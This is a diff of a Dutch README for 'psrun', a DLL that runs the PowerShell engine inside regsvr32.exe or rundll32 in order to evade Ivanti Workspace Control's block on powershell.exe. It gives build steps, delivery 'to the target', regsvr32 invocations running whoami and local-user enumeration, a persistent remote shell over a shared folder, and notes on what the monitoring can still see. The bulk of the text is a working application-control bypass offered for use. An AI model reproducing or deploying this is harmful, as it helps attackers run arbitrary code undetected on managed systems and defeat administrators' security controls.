@@ -1,103 +1,161 @@
-# psrun - code-exec springboard via regsvr32 (in-process PowerShell)
+# psrun — code-exec springboard via regsvr32 (in-process PowerShell)
 
 Ivanti Workspace Control blokkeert `powershell.exe`/`pwsh.exe` als executable.
-Deze DLL host de CLR **in het regsvr32.exe process** en draait daar de
-PowerShell engine (`System.Management.Automation`). Er wordt **geen** powershell/pwsh
-process gestart: alleen `regsvr32.exe` + 2 DLL loads zijn zichtbaar. Geen registry
-writes, geen elevation nodig, statische CRT.
+psrun host de CLR **in het regsvr32.exe process** en draait daar de PowerShell
+engine (`System.Management.Automation`). Er wordt **geen** powershell/pwsh
+process gestart: alleen `regsvr32.exe` plus twee DLL-loads zijn zichtbaar.
+Geen registry writes, geen elevation, geen VC redist, geen config files.
 
-## Files
+```
+regsvr32.exe ──loads──> psrun_host.dll ──hosts──> CLR v4 ──runs──> PS engine
+                                                        (PSRunner.dll)
+```
 
-    psrun_host.cpp      native host - CLR in-process (self-contained, geen SDK headers nodig)
-    PSRunner.cs         managed payload - PS runspace + arg parsing
-    PSRunner.csproj     mac-build voor de runner (dotnet, geen Windows nodig)
-    build_host_mac.sh   host bouwen met mingw-w64 (mac)
-    build_runner.cmd    fallback: runner bouwen op een Windows box
-    build_msvc.cmd      optioneel: alles via MSVC
+---
 
-## Build (100% vanaf de mac)
+## 1. Prereqs (eenmalig, build machine)
 
-    # eenmalig:
-    brew install mingw-w64
-    brew install --cask dotnet-sdk
+```sh
+# macOS (Apple Silicon native — geen Rosetta nodig; de cross-compiler
+# draait op arm64 en levert x64 Windows-binaries):
+brew install mingw-w64
+brew install --cask dotnet-sdk
+```
 
-    # host:
-    ./build_host_mac.sh                     # -> psrun_host.dll
+Linux werkt identiek (`apt install mingw-w64 gpg? nee: g++-mingw-w64-x86-64
++ dotnet-sdk via packages.microsoft.com of install script).
 
-    # runner:
-    dotnet build PSRunner.csproj -c Release # -> PSRunner.dll
+> Windows als buildbak kan ook, maar is niet nodig: alles hieronder gaat
+> vanaf mac/linux. De target zelf wordt nooit op gebouwd.
 
-    # deliveren: psrun_host.dll + PSRunner.dll samen in een dir op de target
-    #            (PSRunner.dll hoeft pas opnieuw gebouwd als PSRunner.cs wijzigt)
+## 2. Bouwen
 
-    # optioneel/alt: build_msvc.cmd (MSVC) of build_runner.cmd (op een Windows box)
+```sh
+cd ~/Cross-VM/psrun
 
-## Gebruik
+# 2a. native host  ->  psrun_host.dll
+./build_host_mac.sh
 
-    regsvr32 /s /n /i:"-c Get-Process | select -First 5" C:\stg\psrun_host.dll
-    regsvr32 /s /n /i:"-f \\srv\stg\task.ps1 -out C:\stg\out.txt" C:\stg\psrun_host.dll
-    regsvr32 /s /n /i:"-f C:\stg\task.ps1 -Domain dc1 -UserX" C:\stg\psrun_host.dll
+# 2b. managed runner  ->  PSRunner.dll (komt in de projectroot terecht)
+dotnet build PSRunner.csproj -c Release
+```
 
-Alternatieve vector, zelfde DLL (als rundll32 wel mag):
+Controle:
 
-    rundll32 C:\stg\psrun_host.dll,RunPS -c whoami
+```sh
+ls -la psrun_host.dll PSRunner.dll
+# psrun_host  ~110 KB   PSRunner ~12 KB, beide verse timestamps
+```
 
-Lange/quoted one-liners: args via env, dan volstaat plain regsvr32:
+`build_host_mac.sh` print de imports van de dll — verwacht alleen
+`KERNEL32.dll`, `USER32.dll` en `api-ms-win-crt-*` (UCRT, inbox in Windows).
 
-    set PSRUN_ARGS=-c Get-LocalUser | ft -auto
-    regsvr32 /s C:\stg\psrun_host.dll
+## 3. Deliveren naar de target
 
-## Persistente shell (aanraden)
+Precies **twee** bestanden, in **dezelfde** map, bijv. `C:\temp\`:
 
-Een keer starten, daarna commands vanaf de mac - de shell draait door in het
-regsvr32-proces (state/variabelen/cd blijven bewaard):
+```
+psrun_host.dll
+PSRunner.dll
+```
 
-    # target (1x, via jouw launch-vector):
-    regsvr32 /s /n /i:"-shell C:\stg\sh" C:\stg\psrun_host.dll
+- NIETS anders is nodig (geen .cs, geen SMA.dll — die bindt aan de GAC)
+- versie-check: bestandsgrootte op de target = `ls -la` op de mac
+- nieuwe map gebruiken als er oude gelockte dll's rondzwerven
+  (een geladen DLL mag niet overschreven worden)
 
-    # mac: wiens de gedeelde map; zelfde map als C:\stg\sh op de target:
-    export PSRUN_DIR=/pad/naar/Cross-VM/sh
-    export PSRUN_TGT='C:\stg\sh'
+## 4. Gebruiken (op de target, via eigen lanceermiddel)
 
-    ./psrun.sh 'Get-Process | select -First 3'   # -> output direct
-    ./psrun.sh '$x=1;$x+41'                      # variabelen blijven
-    ./psrun.sh exit                              # shell netjes stoppen
+**Let op: altijd de 64-bit regsvr32 (`System32`, niet `SysWOW64`).**
 
-Protocol: `<dir>\NAME.in` (multi-line PS) -> `NAME.out`. `shell.log` = up/down.
-Stoppen kan ook door het regsvr32-proces te killen.
+### 4a. Saniteitcheck (eenmalige exec, output naar bestand)
 
-## Arg grammar (PSRunner)
+```
+regsvr32 /s /n /i:"-c whoami" C:\temp\psrun_host.dll
+type %TEMP%\psrun.log
+```
 
-    -c <script>            script tekst (rest van de regel)
-    -f <path.ps1> [args]   script file; rest = script-parameters
-    -out <file>            output path (default %TEMP%\psrun.log)
-    -raw                   geen Out-String (raw objects)
+Verwacht: header `=== host: regsvr32 pid N ===` + whoami-output.
 
-Let op: zet `-out`/`-raw` **vóór** `-c`. Gebruik `Write-Output`, geen
-`Write-Host` (er is geen host-UI). Een trailing `# comment` in `-c` breekt de
-appende `| Out-String` - in dat geval `-raw`.
+### 4b. Interactieve shell op de target zelf
 
-## Output / troubleshooting
+```
+regsvr32 /s /n /i:"-con" C:\temp\psrun_host.dll
+```
 
-- `%TEMP%\psrun.log` - script output + `=== host: regsvr32 pid N ===` header
-  (bewijst in-process; verwacht géen powershell in procexplorer)
-- `%TEMP%\psrun_err.log` - native failures (CLR load, PSRunner niet gevonden, ...)
-- `hr=0x80070002` bij ExecuteInDefaultAppDomain -> PSRunner.dll niet naast de host
-- x64 DLL -> `C:\Windows\System32\regsvr32.exe`
-- check imports van de gebouwde dll:
-  `x86_64-w64-mingw32-objdump -p psrun_host.dll | grep 'DLL Name'`
-  (verwacht alleen kernel32/user32 - geen libwinpthread/libstdc++ deps)
+Opent een **consolevenster op de desktop van die user-session** met een
+`PS>`-prompt. Typen = PowerShell, engine in-process. `exit` sluit netjes.
+Variabelen/cd blijven per commando bewaard. Let op: geen venster als de
+launch in session 0/services plaatsvindt — dan in users-context lanceren.
 
-## Aanpassen
+### 4c. Payload via scriptbestand
 
-- **Payload/logica**: `PSRunner.cs` - herbouw met `build_runner.cmd`.
-- **Loader**: `psrun_host.cpp` - CLR startup, arg parsing, entrypoints.
+```
+regsvr32 /s /n /i:"-f C:\pad\task.ps1 -Param1 waarde" C:\temp\psrun_host.dll
+```
 
-## Notes
+### 4d. Lange/quoted one-liners (cmdline-limiet omzeilen)
 
-- .NET Framework 4.x (CLR v4.0.30319) + Windows PowerShell 5.1 engine - Win7+;
-  **geen** afhankelijkheid van PowerShell 7.
-- AMSI/ETW en IWC module-regels gelden gewoon (echte PS runspace in-process).
-- PowerShell 7 hosting (pwsh, .NET Core) kan later via `hostfxr` - ander
-  traject, zelfde concept.
-- `regsvr32` zonder `/i` + zonder `PSRUN_ARGS` = silent no-op (load-test).
+```
+set PSRUN_ARGS=-c <script of -d base64>
+regsvr32 /s C:\temp\psrun_host.dll
+```
+
+### Arg grammar (PSRunner)
+
+| arg | betekenis |
+|---|---|
+| `-con` | console-window shell op de target |
+| `-shell <dir>` | file-based: `NAME.in` → `NAME.out`, state persistent, `exit` stopt |
+| `-c <script>` | one-shot, rest van de regel = script |
+| `-f <path.ps1> [args]` | one-shot scriptbestand, rest = parameters |
+| `-out <file>` | output path (default `%TEMP%\psrun.log`) |
+| `-raw` | geen `Out-String`; zet `-out`/`-raw` vóór `-c` |
+
+Output altijd via `Write-Output`, niet `Write-Host` (geen host-UI).
+
+## 5. Problemen oplossen
+
+| bestand | inhoud |
+|---|---|
+| `%TEMP%\psrun.log` | script-output + `host: <proces> pid N` header |
+| `%TEMP%\psrun_err.log` | native failures, **met timestamp + grootte/datum van de gevonden PSRunner.dll** |
+| `%TEMP%\psrun_fatal.log` | managed excepties met stack (console setup e.d.) |
+
+Klassiekers:
+
+| symptoom | oorzaak → oplossing |
+|---|---|
+| `PSRunner.dll niet gevonden in: ...` | geen/misplaatste runner → zelfde map als host |
+| `runner gevonden ... (N bytes)` wijkt af van mac | stale copy → vers leveren |
+| `hr=0x80131523` | entry niet gevonden/throw in shell-setup → `psrun_fatal.log` |
+| `hr=0x8007000B` | x86/x64 mismatch → `System32\regsvr32` |
+| geen venster bij `-con` | launch in session 0 → users-context gebruiken |
+| `regsvr32: dll geladen, DllInstall mislukt` | zie err-log; zonder `/s` voor de dialog |
+
+## 6. Vereisten op de target
+
+- x64 Windows, launch via 64-bit regsvr32
+- .NET Framework 4.x (CLR `v4.0.30319`) — Win7/10/11 standaard
+- Windows PowerShell 5.1 engine (GAC) — Win10/11 standaard
+- beide dll's in dezelfde map, leesbaar voor de user
+- interactieve session voor `-con`
+
+## 7. Hardcoded feiten (wetenswaardig bij aanpassen)
+
+- entry-contract: type `PSRunner.Entry`, method `public static int Run(string)`
+  — staat in zowel `psrun_host.cpp` als `PSRunner.cs`
+- CLR runtime string `v4.0.30319` en bestandsnaam `PSRunner.dll` (naast de host)
+- logs in `%TEMP%`; arg-buffer 8192 tekens; `MAX_PATH` paden
+- output formatting `Out-String -Width 200`; shell-poll 300 ms
+- IWC ziet: regsvr32.exe + `clr.dll`/`mscoree` + `PSRunner.dll` +
+  `System.Management.Automation` loads. Geen child-processen.
+
+## 8. Aanpassen & herbouwen
+
+| wat | waar | daarna |
+|---|---|---|
+| payload/logica/args | `PSRunner.cs` | `dotnet build PSRunner.csproj -c Release`, alleen `PSRunner.dll` her-deliveren |
+| CLR startup, entrypoints, logging | `psrun_host.cpp` | `./build_host_mac.sh`, alleen `psrun_host.dll` her-deliveren |
+
+Entry host ↔ runner contract niet wijzigen zonder beide te rebuilden.
